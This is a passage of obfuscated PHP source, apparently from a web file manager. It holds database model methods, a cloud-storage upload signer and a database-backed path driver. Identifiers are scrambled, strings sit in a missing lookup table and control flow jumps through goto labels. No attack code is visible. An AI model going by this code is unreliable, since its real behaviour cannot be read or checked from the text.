$Aù¹â‚«¹ì[$eœõïíƒÛ[0]] = $fÏ¦’Ù—Š[$eœõïíƒÛ[0]]; } if (!empty($fÏ¦’Ù—Š[$this->getPk()])) { $Aù¹â‚«¹ì[$this->getPk()] = array($C÷à°›§Î[327], $fÏ¦’Ù—Š[$this->getPk()]); } if ($this->where($Aù¹â‚«¹ì)->find()) { return !1; } return !0; default: return $this->check($fÏ¦’Ù—Š[$eœõïíƒÛ[0]], $eœõïíƒÛ[1], $eœõïíƒÛ[4]); } } public function check($b¬ó‹Ã°¦, $F¼èÃ‘×¬¯, $D±‘œï¹Çá = "\x72\145\x67\145\x78") { $eÏ‡…è—­æ =& $_SERVER[ç]; $D±‘œï¹Çá = strtolower(trim($D±‘œï¹Çá)); switch ($D±‘œï¹Çá) { case $eÏ‡…è—­æ[7]: case $eÏ‡…è—­æ[328]: $F‰‚²Ä©…ê = is_array($F¼èÃ‘×¬¯) ? $F¼èÃ‘×¬¯ : explode($eÏ‡…è—­æ[47], $F¼èÃ‘×¬¯); return $D±‘œï¹Çá == $eÏ‡…è—­æ[7] ? in_array($b¬ó‹Ã°¦, $F‰‚²Ä©…ê) : !in_array($b¬ó‹Ã°¦, $F‰‚²Ä©…ê); case $eÏ‡…è—­æ[329]: case $eÏ‡…è—­æ[330]: if (is_array($F¼èÃ‘×¬¯)) { $D†¦…õÅË¼ = $F¼èÃ‘×¬¯[0]; $Bæ‘ç¯‰èÆ = $F¼èÃ‘×¬¯[1]; } else { list($D†¦…õÅË¼, $Bæ‘ç¯‰èÆ) = explode($eÏ‡…è—­æ[47], $F¼èÃ‘×¬¯); } return $D±‘œï¹Çá == $eÏ‡…è—­æ[329] ? $b¬ó‹Ã°¦ >= $D†¦…õÅË¼ && $b¬ó‹Ã°¦ <= $Bæ‘ç¯‰èÆ : $b¬ó‹Ã°¦ < $D†¦…õÅË¼ || $b¬ó‹Ã°¦ > $Bæ‘ç¯‰èÆ; case $eÏ‡…è—­æ[331]: case $eÏ‡…è—­æ[332]: return $D±‘œï¹Çá == $eÏ‡…è—­æ[331] ? $b¬ó‹Ã°¦ == $F¼èÃ‘×¬¯ : $b¬ó‹Ã°¦ != $F¼èÃ‘×¬¯; case $eÏ‡…è—­æ[333]: $BÕÆŠ¹ËìØ = mb_strlen($b¬ó‹Ã°¦, $eÏ‡…è—­æ[334]); if (strpos($F¼èÃ‘×¬¯, $eÏ‡…è—­æ[47])) { list($D†¦…õÅË¼, $Bæ‘ç¯‰èÆ) = explode($eÏ‡…è—­æ[47], $F¼èÃ‘×¬¯); return $BÕÆŠ¹ËìØ >= $D†¦…õÅË¼ && $BÕÆŠ¹ËìØ <= $Bæ‘ç¯‰èÆ; } else { return $BÕÆŠ¹ËìØ == $F¼èÃ‘×¬¯; } case $eÏ‡…è—­æ[335]: list($Cß•ßÓ²Ëš, $Fä‰ßªÑ—ß) = explode($eÏ‡…è—­æ[47], $F¼èÃ‘×¬¯); if (!is_numeric($Cß•ßÓ²Ëš)) { $Cß•ßÓ²Ëš = strtotime($Cß•ßÓ²Ëš); } if (!is_numeric($Fä‰ßªÑ—ß)) { $Fä‰ßªÑ—ß = strtotime($Fä‰ßªÑ—ß); } return NOW_TIME >= $Cß•ßÓ²Ëš && NOW_TIME <= $Fä‰ßªÑ—ß; case $eÏ‡…è—­æ[336]: return in_array(get_client_ip(), explode($eÏ‡…è—­æ[47], $F¼èÃ‘×¬¯)); case $eÏ‡…è—­æ[337]: return !in_array(get_client_ip(), explode($eÏ‡…è—­æ[47], $F¼èÃ‘×¬¯)); case $eÏ‡…è—­æ[324]: default: return $this->regex($b¬ó‹Ã°¦, $F¼èÃ‘×¬¯); } } public function query($a‡‚ÂíÉ†ñ, $EöçÕ¿áÅ = false) { $c‹‰¶¡î‡ã =& $_SERVER[ç]; if (!is_bool($EöçÕ¿áÅ) && !is_array($EöçÕ¿áÅ)) { $EöçÕ¿áÅ = func_get_args(); array_shift($EöçÕ¿áÅ); } $a‡‚ÂíÉ†ñ = str_replace(array($c‹‰¶¡î‡ã[227], $c‹‰¶¡î‡ã[338]), $c‹‰¶¡î‡ã[50], $a‡‚ÂíÉ†ñ); $a‡‚ÂíÉ†ñ = $this->parseSql($a‡‚ÂíÉ†ñ, $EöçÕ¿áÅ); return $this->db->query($a‡‚ÂíÉ†ñ); } public function execute($D½õŠö‰­Æ, $AŞ¨Š˜‚‚± = false) { if (!is_bool($AŞ¨Š˜‚‚±) && !is_array($AŞ¨Š˜‚‚±)) { $AŞ¨Š˜‚‚± = func_get_args(); array_shift($AŞ¨Š˜‚‚±); } $D½õŠö‰­Æ = $this->parseSql($D½õŠö‰­Æ, $AŞ¨Š˜‚‚±); return $this->db->execute($D½õŠö‰­Æ); } protected function parseSql($DÔÅèóŞ†¿, $e®×¬ÌÈ±) { $C˜µ³âë× =& $_SERVER[ç]; if (!0 === $e®×¬ÌÈ±) { $BÅ³Ÿ‚é = $this->_parseOptions(); $DÔÅèóŞ†¿ = $this->db->parseSql($DÔÅèóŞ†¿, $BÅ³Ÿ‚é); } elseif (is_array($e®×¬ÌÈ±)) { $e®×¬ÌÈ± = array_map(array($this->db, $C˜µ³âë×[339]), $e®×¬ÌÈ±); $DÔÅèóŞ†¿ = vsprintf($DÔÅèóŞ†¿, $e®×¬ÌÈ±); } else { $DÔÅèóŞ†¿ = strtr($DÔÅèóŞ†¿, array($C˜µ³âë×[340] => $this->getTableName(), $C˜µ³âë×[341] => think_config($C˜µ³âë×[240]))); } $this->db->setModel($this->name); return $DÔÅèóŞ†¿; } public function db($c‰ä»¿ç = '', $D³š¦·é = '', $a¦„•õÅ© = array()) { goto a­‘Óãß²; a­‘Óãß²: $FÒ„ôİÃÕß =& $_SERVER[ç]; if ($FÒ„ôİÃÕß[33] === $c‰ä»¿ç && $this->db) { return $this->db; } static $f¤ó…†½™ = array(); goto F‘ˆĞ­È¬; C‚ÆËä„¼¾: $f¤ó…†½™[$c‰ä»¿ç] = $D³š¦·é; $this->db = $C…Û‘¤Ä‘œ[$c‰ä»¿ç]; $this->_after_db(); goto Aí‹é–ŸÜÃ; Aí‹é–ŸÜÃ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto eØá†Æ½á¾; F‘ˆĞ­È¬: static $C…Û‘¤Ä‘œ = array(); if (!isset($C…Û‘¤Ä‘œ[$c‰ä»¿ç]) || isset($C…Û‘¤Ä‘œ[$c‰ä»¿ç]) && $D³š¦·é && $f¤ó…†½™[$c‰ä»¿ç] != $D³š¦·é) { if (!empty($D³š¦·é) && is_string($D³š¦·é) && !1 === strpos($D³š¦·é, $FÒ„ôİÃÕß[8])) { $D³š¦·é = think_config($D³š¦·é); } $C…Û‘¤Ä‘œ[$c‰ä»¿ç] = Db::getInstance($D³š¦·é); } elseif (NULL === $D³š¦·é) { $C…Û‘¤Ä‘œ[$c‰ä»¿ç]->close(); unset($C…Û‘¤Ä‘œ[$c‰ä»¿ç]); return; } if (!empty($a¦„•õÅ©)) { if (is_string($a¦„•õÅ©)) { parse_str($a¦„•õÅ©, $a¦„•õÅ©); } foreach ($a¦„•õÅ© as $cƒÄ³âµÖ => $D±—å†Š„«) { $this->setProperty($cƒÄ³âµÖ, $D±—å†Š„«); } } goto C‚ÆËä„¼¾; eØá†Æ½á¾: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $fë—‰ìšÍ¿ = get_class($this); if ($fë—‰ìšÍ¿ == $_SERVER[ç][342]) { return $this->name; } $this->name = substr($fë—‰ìšÍ¿, 0, -5); } return $this->name; } public function getTableName() { $b‡•¯¯×ä =& $_SERVER[ç]; if (empty($this->trueTableName)) { $dÏãÆ‘›Ü… = !empty($this->tablePrefix) ? $this->tablePrefix : $b‡•¯¯×ä[33]; if (!empty($this->tableName)) { $dÏãÆ‘›Ü… .= $this->tableName; } else { $dÏãÆ‘›Ü… .= think_parse_name($this->name); } $this->trueTableName = strtolower($dÏãÆ‘›Ü…); } return (!empty($this->dbName) ? $this->dbName . $b‡•¯¯×ä[94] : $b‡•¯¯×ä[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $c‰©¶í†÷ =& $_SERVER[ç]; return isset($this->fields[$c‰©¶í†÷[247]]) ? $this->fields[$c‰©¶í†÷[247]] : $this->pk; } public function getDbFields() { $f‡Õ»¨°»Ç =& $_SERVER[ç]; if (isset($this->options[$f‡Õ»¨°»Ç[275]])) { $bŒ»ôÃÜõˆ = $this->db->getFields($this->options[$f‡Õ»¨°»Ç[275]]); return $bŒ»ôÃÜõˆ ? array_keys($bŒ»ôÃÜõˆ) : !1; } if ($this->fields) { $bŒ»ôÃÜõˆ = $this->fields; unset($bŒ»ôÃÜõˆ[$f‡Õ»¨°»Ç[246]], $bŒ»ôÃÜõˆ[$f‡Õ»¨°»Ç[247]], $bŒ»ôÃÜõˆ[$f‡Õ»¨°»Ç[248]], $bŒ»ôÃÜõˆ[$f‡Õ»¨°»Ç[245]]); return $bŒ»ôÃÜõˆ; } return !1; } public function data($F…ó¹½‡ƒÀ = '') { $EÏ—‹ºÆæ =& $_SERVER[ç]; if ($EÏ—‹ºÆæ[33] === $F…ó¹½‡ƒÀ && !empty($this->data)) { return $this->data; } if (is_object($F…ó¹½‡ƒÀ)) { $F…ó¹½‡ƒÀ = get_object_vars($F…ó¹½‡ƒÀ); } elseif (is_string($F…ó¹½‡ƒÀ)) { parse_str($F…ó¹½‡ƒÀ, $F…ó¹½‡ƒÀ); } elseif (!is_array($F…ó¹½‡ƒÀ)) { think_exception(think_lang($EÏ—‹ºÆæ[267])); } $this->data = $F…ó¹½‡ƒÀ; return $this; } public function join($Cµï»ºÅ±™) { $e÷ÚÏòœã =& $_SERVER[ç]; if (is_array($Cµï»ºÅ±™)) { $this->options[$e÷ÚÏòœã[278]] = $Cµï»ºÅ±™; } elseif (!empty($Cµï»ºÅ±™)) { $this->options[$e÷ÚÏòœã[278]][] = $Cµï»ºÅ±™; } return $this; } public function union($Fª «ˆ‚í×, $bí‡ÃŞáªÃ = false) { goto bÌ¤‚ÕŞÛ³; bÌ¤‚ÕŞÛ³: $Eùß‰ß–éß =& $_SERVER[ç]; if (empty($Fª «ˆ‚í×)) { return $this; } if ($bí‡ÃŞáªÃ) { $this->options[$Eùß‰ß–éß[343]][$Eùß‰ß–éß[344]] = !0; } goto cº½ÔĞİ; Eø„½®â: return $this; goto C—“©ïñŒœ; cº½ÔĞİ: if (is_object($Fª «ˆ‚í×)) { $Fª «ˆ‚í× = get_object_vars($Fª «ˆ‚í×); } if (is_string($Fª «ˆ‚í×)) { $fõÒë¸ê¥ò = $Fª «ˆ‚í×; } elseif (is_array($Fª «ˆ‚í×)) { if (isset($Fª «ˆ‚í×[0])) { $this->options[$Eùß‰ß–éß[343]] = array_merge($this->options[$Eùß‰ß–éß[343]], $Fª «ˆ‚í×); return $this; } else { $fõÒë¸ê¥ò = $Fª «ˆ‚í×; } } else { think_exception(think_lang($Eùß‰ß–éß[267])); } $this->options[$Eùß‰ß–éß[343]][] = $fõÒë¸ê¥ò; goto Eø„½®â; C—“©ïñŒœ: } public function cache($CÁöœÑäèõ = true, $b‰„‘¿°Íô = null, $Dë† ÂŒ˜½ = '') { $DŸÌ•†ğ÷ =& $_SERVER[ç]; if (!1 !== $CÁöœÑäèõ) { $this->options[$DŸÌ•†ğ÷[345]] = array($DŸÌ•†ğ÷[92] => $CÁöœÑäèõ, $DŸÌ•†ğ÷[335] => $b‰„‘¿°Íô, $DŸÌ•†ğ÷[29] => $Dë† ÂŒ˜½); } return $this; } public function field($c‡ê ò¨ƒ, $DŞŞ¸íùÉ = false) { $CšŞëíŒğÜ =& $_SERVER[ç]; if (!0 === $c‡ê ò¨ƒ) { $aî‡™«ÌÀ = $this->getDbFields(); $c‡ê ò¨ƒ = $aî‡™«ÌÀ ? $aî‡™«ÌÀ : $CšŞëíŒğÜ[182]; } elseif ($DŞŞ¸íùÉ) { if (is_string($c‡ê ò¨ƒ)) { $c‡ê ò¨ƒ = explode($CšŞëíŒğÜ[47], $c‡ê ò¨ƒ); } $aî‡™«ÌÀ = $this->getDbFields(); $c‡ê ò¨ƒ = $aî‡™«ÌÀ ? array_diff($aî‡™«ÌÀ, $c‡ê ò¨ƒ) : $c‡ê ò¨ƒ; } $this->options[$CšŞëíŒğÜ[269]] = $c‡ê ò¨ƒ; return $this; } public function scope($C Â‹§¹ß = '', $b·äÉÑ”Ñ = NULL) { $F¥â‘ñ½¥ =& $_SERVER[ç]; if ($F¥â‘ñ½¥[33] === $C Â‹§¹ß) { if (isset($this->_scope[$F¥â‘ñ½¥[34]])) { $c•×µî · = $this->_scope[$F¥â‘ñ½¥[34]]; } else { return $this; } } elseif (is_string($C Â‹§¹ß)) { $eóá™ÂŠ­ = explode($F¥â‘ñ½¥[47], $C Â‹§¹ß); $c•×µî · = array(); foreach ($eóá™ÂŠ­ as $DÄëéæ¯°®) { if (!isset($this->_scope[$DÄëéæ¯°®])) { continue; } $c•×µî · = array_merge($c•×µî ·, $this->_scope[$DÄëéæ¯°®]); } if (!empty($b·äÉÑ”Ñ) && is_array($b·äÉÑ”Ñ)) { $c•×µî · = array_merge($c•×µî ·, $b·äÉÑ”Ñ); } } elseif (is_array($C Â‹§¹ß)) { $c•×µî · = $C Â‹§¹ß; } if (is_array($c•×µî ·) && !empty($c•×µî ·)) { $this->options = array_merge($this->options, array_change_key_case($c•×µî ·)); } return $this; } public function where($c¨èÀ½«Ùì, $f°‰ØŒùæƒ = null) { $bÆ¨Í› =& $_SERVER[ç]; if (!is_null($f°‰ØŒùæƒ) && is_string($c¨èÀ½«Ùì)) { if (!is_array($f°‰ØŒùæƒ)) { $f°‰ØŒùæƒ = func_get_args(); array_shift($f°‰ØŒùæƒ); } $f°‰ØŒùæƒ = array_map(array($this->db, $bÆ¨Í›[339]), $f°‰ØŒùæƒ); $c¨èÀ½«Ùì = vsprintf($c¨èÀ½«Ùì, $f°‰ØŒùæƒ); } elseif (is_object($c¨èÀ½«Ùì)) { $c¨èÀ½«Ùì = get_object_vars($c¨èÀ½«Ùì); } elseif (is_array($c¨èÀ½«Ùì)) { foreach ($c¨èÀ½«Ùì as $E¡ğ¤Ê¹˜ => $D¸İ–İ¢†) { if ((is_numeric($E¡ğ¤Ê¹˜) || !$E¡ğ¤Ê¹˜) && is_string($D¸İ–İ¢†)) { if (strpos($D¸İ–İ¢†, $bÆ¨Í›[346]) === 0) { continue; } think_trace($bÆ¨Í›[347], $bÆ¨Í›[33], $bÆ¨Í›[46]); die; } } } if (is_string($c¨èÀ½«Ùì) && $bÆ¨Í›[33] != $c¨èÀ½«Ùì) { $AõŒœ“Şê½ = array(); $AõŒœ“Şê½[$bÆ¨Í›[348]] = $c¨èÀ½«Ùì; $c¨èÀ½«Ùì = $AõŒœ“Şê½; } if (isset($this->options[$bÆ¨Í›[271]])) { $this->options[$bÆ¨Í›[271]] = array_merge($this->options[$bÆ¨Í›[271]], $c¨èÀ½«Ùì); } else { $this->options[$bÆ¨Í›[271]] = $c¨èÀ½«Ùì; } return $this; } public function limit($eè‚‰§¤, $Dï•ˆŸ‚¹ï = null) { $E¾ïÌØ¦÷À =& $_SERVER[ç]; $this->options[$E¾ïÌØ¦÷À[288]] = is_null($Dï•ˆŸ‚¹ï) ? $eè‚‰§¤ : $eè‚‰§¤ . $E¾ïÌØ¦÷À[47] . $Dï•ˆŸ‚¹ï; return $this; } public function page($Bãã¡Ôç˜Œ, $E‹ì¹Ÿò¼ = null) { $d„²á´ÔÉ¦ =& $_SERVER[ç]; $this->options[$d„²á´ÔÉ¦[349]] = is_null($E‹ì¹Ÿò¼) ? $Bãã¡Ôç˜Œ : $Bãã¡Ôç˜Œ . $d„²á´ÔÉ¦[47] . $E‹ì¹Ÿò¼; return $this; } public function comment($f—Éìˆ‚°¾) { $this->options[$_SERVER[ç][350]] = $f—Éìˆ‚°¾; return $this; } public function setProperty($cÀÚ†’†Áù, $F¤‚ß±ø¼…) { if (property_exists($this, $cÀÚ†’†Áù)) { $this->{$cÀÚ†’†Áù} = $F¤‚ß±ø¼…; } return $this; } } goto bÛ…ö¹å–Ë; B„ØŠùèŞÜ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($f‘õò‹—í) { parent::__construct($f‘õò‹—í); $this->signatureVersion($_SERVER[ç][210]); } public function uploadFormData($Eîö¹·™ˆ, $EØÍ±”éªµ = 3600) { goto b”ÚÅé¶ƒ¢; c¶İ‡±œšç: $dá‹†°Å¸ª = sha1($Cª›×ƒËÚ); $c¿×‰Âñ†¼ = hash_hmac($F¡øèçãô®[228], $dá‹†°Å¸ª, $D½³ì´à¯); $B˜‡õ‚“ = array($F¡øèçãô®[1158] => $Cß™í™ç–§, $F¡øèçãô®[1162] => $D¸·ó´„Ö®, $F¡øèçãô®[1166] => base64_encode($Cª›×ƒËÚ), $F¡øèçãô®[1163] => $DÌÉ¼®›‡Ü, $F¡øèçãô®[1164] => $this->accessKey, $F¡øèçãô®[1167] => $Aé‚ß¥÷½Ï, $F¡øèçãô®[1168] => $c¿×‰Âñ†¼, $F¡øèçãô®[175] => $this->getHost()); goto F—ø¼ƒÙ£; c¸šßÕ¨õø: $Cª›×ƒËÚ = array($F¡øèçãô®[1156] => $C¾˜Õ‹óŞ…, $F¡øèçãô®[1157] => array(array($F¡øèçãô®[1158] => $Cß™í™ç–§), array($F¡øèçãô®[1159] => $this->bucket), array($F¡øèçãô®[1160], $F¡øèçãô®[1161], $F¡øèçãô®[33]), array($F¡øèçãô®[1162] => $D¸·ó´„Ö®), array($F¡øèçãô®[1163] => $DÌÉ¼®›‡Ü), array($F¡øèçãô®[1164] => $this->accessKey), array($F¡øèçãô®[1165] => $Aé‚ß¥÷½Ï))); $Cª›×ƒËÚ = json_encode($Cª›×ƒËÚ); $D½³ì´à¯ = hash_hmac($F¡øèçãô®[228], $Aé‚ß¥÷½Ï, $this->secret); goto c¶İ‡±œšç; F—ø¼ƒÙ£: return $B˜‡õ‚“; goto aÛ•ˆ‹¡‡‚; b”ÚÅé¶ƒ¢: $F¡øèçãô® =& $_SERVER[ç]; $Cß™í™ç–§ = $F¡øèçãô®[191]; $DÌÉ¼®›‡Ü = $F¡øèçãô®[228]; goto CÖ¬¼İ¬¾«; CÖ¬¼İ¬¾«: $D¸·ó´„Ö® = $F¡øèçãô®[1154]; $C¾˜Õ‹óŞ… = gmdate($F¡øèçãô®[1155], time() + $EØÍ±”éªµ); $Aé‚ß¥÷½Ï = (string) time() . $F¡øèçãô®[67] . (string) (time() + $EØÍ±”éªµ); goto c¸šßÕ¨õø; aÛ•ˆ‹¡‡‚: } public function fileOutLink($Fµ®õ›íÛ) { $D©ˆÙÚºî =& $_SERVER[ç]; if (substr($Fµ®õ›íÛ, 0, 7) == $D©ˆÙÚºî[1169]) { $Fµ®õ›íÛ = $D©ˆÙÚºî[1170] . substr($Fµ®õ›íÛ, 7); } header($D©ˆÙÚºî[158] . $Fµ®õ›íÛ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($B¨–Ù°ÊòÁ) { $this->pathParse = $B¨–Ù°ÊòÁ; $this->model = Model($_SERVER[ç][1171]); } public function getPath($fø‰Ã‘°À) { return trim($fø‰Ã‘°À, $_SERVER[ç][8]); } public function pathFather($fğ»ğÎ¬Ûé) { $FàÉƒÔÜˆñ = $this->parse($fğ»ğÎ¬Ûé); $FàÉƒÔÜˆñ = $this->infoSimple($fğ»ğÎ¬Ûé); return $FàÉƒÔÜˆñ ? $FàÉƒÔÜˆñ[$_SERVER[ç][472]] : !1; } public function pathThis($B˜Ì¡ÊºÛå) { $AéÎŒè¡‰ = $this->infoSimple($B˜Ì¡ÊºÛå); return $AéÎŒè¡‰ ? $AéÎŒè¡‰[$_SERVER[ç][28]] : !1; } public function getPathOuter($f™†é®¨ìŒ) { if (!$f™†é®¨ìŒ) { return $f™†é®¨ìŒ; } $b›àºæÚĞ = $this->parse($f™†é®¨ìŒ); return KodIO::make($b›àºæÚĞ[$_SERVER[ç][388]]); } public function copyFolderFromIO($f„¶¢Ş÷ , $cùô™Ì—èØ, $B§Â±í‡Õ, $F¥™Ëâ—¸ƒ, $e–¯šè”§) { $C‚ØÏ•š™’ = $this->model->copyFolderFromIO($f„¶¢Ş÷ , $cùô™Ì—èØ, $B§Â±í‡Õ, $F¥™Ëâ—¸ƒ, $e–¯šè”§); return KodIO::make($C‚ØÏ•š™’); } public function isParentOf($DêóŒî¨ÎÆ, $F„–óõßî») { return $this->model->isParentOf($DêóŒî¨ÎÆ, $F„–óõßî»); } public function mkfile($FåğªŠàÖ¡, $EåÒ³Ö‡ù = '', $dªœ¢ĞÇêà = REPEAT_RENAME) { $aÍ†¤Ğ¹ =& $_SERVER[ç]; $F„«ƒÀç¾ = $this->parse($FåğªŠàÖ¡); $FåğªŠàÖ¡ = $F„«ƒÀç¾[$aÍ†¤Ğ¹[388]]; for ($CœÔš¸Å®¸ = 0; $CœÔš¸Å®¸ < count($F„«ƒÀç¾[$aÍ†¤Ğ¹[1172]]); $CœÔš¸Å®¸++) { $Cá¶¿¯ªå = $F„«ƒÀç¾[$aÍ†¤Ğ¹[1172]][$CœÔš¸Å®¸]; if ($CœÔš¸Å®¸ == count($F„«ƒÀç¾[$aÍ†¤Ğ¹[1172]]) - 1) { $FåğªŠàÖ¡ = $this->model->mkfile($FåğªŠàÖ¡, $Cá¶¿¯ªå, $EåÒ³Ö‡ù, $dªœ¢ĞÇêà); break; } $FåğªŠàÖ¡ = $this->model->mkdir($FåğªŠàÖ¡, $Cá¶¿¯ªå, REPEAT_SKIP); } return $this->getPathOuter($FåğªŠàÖ¡); } public function mkdir($EĞÓ½¦ˆÈ, $Bë¥¾ßèãÈ = REPEAT_SKIP) { $d†ƒÈ†”ŒÃ =& $_SERVER[ç]; $d£†öº‡‰ó = $this->parse($EĞÓ½¦ˆÈ); $EĞÓ½¦ˆÈ = $d£†öº‡‰ó[$d†ƒÈ†”ŒÃ[388]]; for ($f¹ÅÂÀí­ì = 0; $f¹ÅÂÀí­ì < count($d£†öº‡‰ó[$d†ƒÈ†”ŒÃ[1172]]); $f¹ÅÂÀí­ì++) { $E’ÕéÚœô¬ = $d£†öº‡‰ó[$d†ƒÈ†”ŒÃ[1172]][$f¹ÅÂÀí­ì]; $EĞÓ½¦ˆÈ = $this->model->mkdir($EĞÓ½¦ˆÈ, $E’ÕéÚœô¬, $Bë¥¾ßèãÈ); } return $this->getPathOuter($EĞÓ½¦ˆÈ); } public function copyFile($fÇ É‘¦Õ¿, $CìÇÓì¥¼Ì, $Fìš­°Îâğ = REPEAT_REPLACE) { $EÂïãÄË…£ =& $_SERVER[ç]; $DŒí½¸¤êÛ = $this->parse($CìÇÓì¥¼Ì); $Eäœš±æ´ñ = $this->model->copy($fÇ É‘¦Õ¿, $DŒí½¸¤êÛ[$EÂïãÄË…£[388]], $Fìš­°Îâğ, $DŒí½¸¤êÛ[$EÂïãÄË…£[75]]); return $Eäœš±æ´ñ ? $this->getPathOuter($Eäœš±æ´ñ) : !1; } public function moveFile($E±¯¬›‹æÄ, $E¾§“¿øÕÉ, $aÆ¾‹í ¸á = REPEAT_REPLACE) { $F¯ÇØÂ§¡¤ =& $_SERVER[ç]; $Bù¬¶Ã¯÷Í = $this->parse($E¾§“¿øÕÉ); $dåƒ‡½Ïªæ = $this->model->move($E±¯¬›‹æÄ, $Bù¬¶Ã¯÷Í[$F¯ÇØÂ§¡¤[388]], $aÆ¾‹í ¸á, $Bù¬¶Ã¯÷Í[$F¯ÇØÂ§¡¤[75]]); return $dåƒ‡½Ïªæ ? $this->getPathOuter($dåƒ‡½Ïªæ) : !1; } public function copy($f§êæ¾Ô®‹, $EõòÖÇçÚÍ, $Cæ•ôÔ‘½ó = REPEAT_REPLACE) { $FÄ¤Ò²é«… = $this->parse($EõòÖÇçÚÍ); $CÑÛØƒ®Şô = $this->model->copy($f§êæ¾Ô®‹, $FÄ¤Ò²é«…[$_SERVER[ç][388]], $Cæ•ôÔ‘½ó); return $CÑÛØƒ®Şô ? $this->getPathOuter($CÑÛØƒ®Şô) : !1; } public function moveSameAllow() { } public function move($DÇñ¤ÔèğÙ, $F³ëÏÃŠÅš, $d‚Ê ‰äÊÇ = REPEAT_REPLACE) { $FÜçõöÈè­ = $this->parse($F³ëÏÃŠÅš); $b„Å‰È²ğ = $this->model->move($DÇñ¤ÔèğÙ, $FÜçõöÈè­[$_SERVER[ç][388]], $d‚Ê ‰äÊÇ); return $b„Å‰È²ğ ? $this->getPathOuter($b„Å‰È²ğ) : !1; } public function remove($E–ø¼è³ƒ, $F‚‰•ê¿İ = true) { return $this->model->remove($E–ø¼è³ƒ, $F‚‰•ê¿İ); } public function rename($d§¿¢Ù‡äŒ, $CŒ‘ÆƒØ×ç) { $C«øìÊ›ŒÉ = $this->model->rename($d§¿¢Ù‡äŒ, $CŒ‘ÆƒØ×ç); return $C«øìÊ›ŒÉ ? $this->getPathOuter($d§¿¢Ù‡äŒ) : $C«øìÊ›ŒÉ; } public function size($D›×áõÆì¬) { $d¡åÚá‡™§ = $this->infoSimple($D›×áõÆì¬); return $d¡åÚá‡™§ ? $d¡åÚá‡™§[$_SERVER[ç][77]] : 0; } public function infoSimple($FÏ…†‚Àéê) { return $this->model->sourceInfo($FÏ…†‚Àéê); } public function info($aÆ–æ’Öï) { return $this->infoParse($aÆ–æ’Öï); } public function infoAuth($fÄË‡¶Ü’¬) { return $this->infoParse($fÄË‡¶Ü’¬, !1, !0); } public function infoWithChildren($fóŞÔ®‰‰) { return $this->infoParse($fóŞÔ®‰‰, !0); } protected function infoParse($díÕ¼…—ö¿, $b®º …½¹ = false, $e½öØĞÍß‰ = false) { if (!$b®º …½¹) { return $this->model->pathInfo($díÕ¼…—ö¿, $e½öØĞÍß‰); } return $this->model->pathInfoMore($díÕ¼…—ö¿); } public function infoFull($fÅÑ‚†¤¡) { $E¤Æ¡˜¤Ú± =& $_SERVER[ç]; $e§¦¤Œ÷š = explode($E¤Æ¡˜¤Ú±[8], $fÅÑ‚†¤¡); $f—È²ÍóÒí = implode($E¤Æ¡˜¤Ú±[8], array_splice($e§¦¤Œ÷š, 1)); return $this->model->pathInfoByPath($e§¦¤Œ÷š[0], $f—È²ÍóÒí); } public function hashSimple($d”åÉ’ë) { $eÔë¿Ûœö =& $_SERVER[ç]; $a¦à²·‰ÓË = $this->infoWithChildren($d”åÉ’ë); return $a¦à²·‰ÓË[$eÔë¿Ûœö[163]][$eÔë¿Ûœö[170]]; } public function hashMd5($ašÜÃáÆ) { $AÊŒ“È¢Ã¦ =& $_SERVER[ç]; $D¥Å×Æ‘‚ = $this->infoWithChildren($ašÜÃáÆ); return $D¥Å×Æ‘‚[$AÊŒ“È¢Ã¦[163]][$AÊŒ“È¢Ã¦[169]]; } public function exist($aºŠğ¨Å™‡) { $eÓ“Ô”šİ¼ =& $_SERVER[ç]; $ašôÈíÏ½‚ = $this->parse($aºŠğ¨Å™‡); if (!$ašôÈíÏ½‚[$eÓ“Ô”šİ¼[75]]) { return $this->isFile($aºŠğ¨Å™‡) || $this->isFolder($aºŠğ¨Å™‡); } $F¢¥˜ê­£Ç = array($eÓ“Ô”šİ¼[389] => $ašôÈíÏ½‚[$eÓ“Ô”šİ¼[388]], $eÓ“Ô”šİ¼[28] => $ašôÈíÏ½‚[$eÓ“Ô”šİ¼[75]]); $f›ãÒ²÷Íõ = $this->model->where($F¢¥˜ê­£Ç)->find(); return $f›ãÒ²÷Íõ ? !0 : !1; } public function isFile($D§³“ğ—œí) { $BÊÖŠ¿Åß¾ =& $_SERVER[ç]; $dö™èÎØ ¥ = $this->infoSimple($D§³“ğ—œí); return $dö™èÎØ ¥ && $dö™èÎØ ¥[$BÊÖŠ¿Åß¾[397]] == $BÊÖŠ¿Åß¾[86] ? !1 : !0; } public function isFolder($D›è™ÀÛÊŠ) { $dºÚÂà¨¬ç =& $_SERVER[ç]; $A ÈåœÃ¨ = $this->infoSimple($D›è™ÀÛÊŠ); return $A ÈåœÃ¨ && $A ÈåœÃ¨[$dºÚÂà¨¬ç[397]] == $dºÚÂà¨¬ç[86] ? !0 : !1; } public function listPath($fß¯Œ¬Ùğñ, $aÕ“Ïñ÷„µ = false) { $f“àÛ§õñõ =& $_SERVER[ç]; if ($fß¯Œ¬Ùğñ == $f“àÛ§õñõ[33]) { return !1; } $c‚âèŠáÊŒ = array($f“àÛ§õñõ[389] => $fß¯Œ¬Ùğñ); if ($aÕ“Ïñ÷„µ) { return $this->model->listSource($c‚âèŠáÊŒ, -1); } return $this->model->listSource($c‚âèŠáÊŒ); } public function has($dí÷ÊÀ—¦¤, $DÅÄÉ…¼¬¦ = false, $cĞß…¾Š­ = null) { $aæ¬ê©‹ä« =& $_SERVER[ç]; $Aä˜¾§Ğâ‡ = $this->infoWithChildren($dí÷ÊÀ—¦¤); if ($DÅÄÉ…¼¬¦) { return array($aæ¬ê©‹ä«[202] => $Aä˜¾§Ğâ‡[$aæ¬ê©‹ä«[202]], $aæ¬ê©‹ä«[201] => $Aä˜¾§Ğâ‡[$aæ¬ê©‹ä«[201]]); } return $cĞß…¾Š­ ? $Aä˜¾§Ğâ‡[$aæ¬ê©‹ä«[202]] : $Aä˜¾§Ğâ‡[$aæ¬ê©‹ä«[201]]; } public function listAll($C°‰›³ãŠ³) { $BÔÜ©ŠòÚé = 